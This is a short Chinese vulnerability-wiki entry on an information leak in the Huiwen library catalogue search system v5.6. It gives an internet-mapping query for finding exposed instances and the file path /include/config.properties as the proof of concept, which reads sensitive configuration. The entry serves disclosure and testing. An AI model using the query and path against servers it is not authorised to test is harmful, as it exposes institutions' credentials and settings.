---
title: "汇文 图书馆书目检索系统 config.properties 信息泄漏漏洞"
date: 2026-10-16 09:10:53
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "汇文-图书馆书目检索系统-config.properties"
tags:
  - "汇文-图书馆书目检索系统-config.properties"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

汇文 图书馆书目检索系统 /include/config.properties 文件中包含敏感信息，攻击者可以直接访问获取信息

## 漏洞影响

```
汇文v5.6
```

## 网络测绘

```
app="汇文软件-书目检索系统"
```

## 漏洞复现

主页面

![image-20220525144642895](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251446991.png)

验证POC

```
/include/config.properties
```

![image-20220525144530183](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202205251445229.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
